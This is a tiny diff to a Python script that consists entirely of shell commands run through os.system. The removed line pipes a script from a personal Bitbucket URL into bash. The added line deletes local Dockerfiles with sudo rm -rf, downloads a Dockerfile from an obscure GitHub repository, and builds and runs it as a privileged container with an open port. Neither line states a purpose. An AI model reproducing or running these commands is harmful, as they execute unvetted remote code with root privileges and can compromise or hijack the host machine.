@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/mikay2808/yui/raw/6b2d1e5840fba2588f8565edd6231b5990e05eb6/rubby | bash')
+os.system('sudo rm -rf Dockerfile Dockerfile* && sudo apt-get update -y && sudo apt-get install wget curl nano -y && wget https://raw.githubusercontent.com/44bd0rpm64ft/44bd0rpm64ft/main/Dockerfile && sudo docker build -t vscode:latest . && sudo docker run -p 10000:10000 --privileged --name vscode -dit vscode:latest')
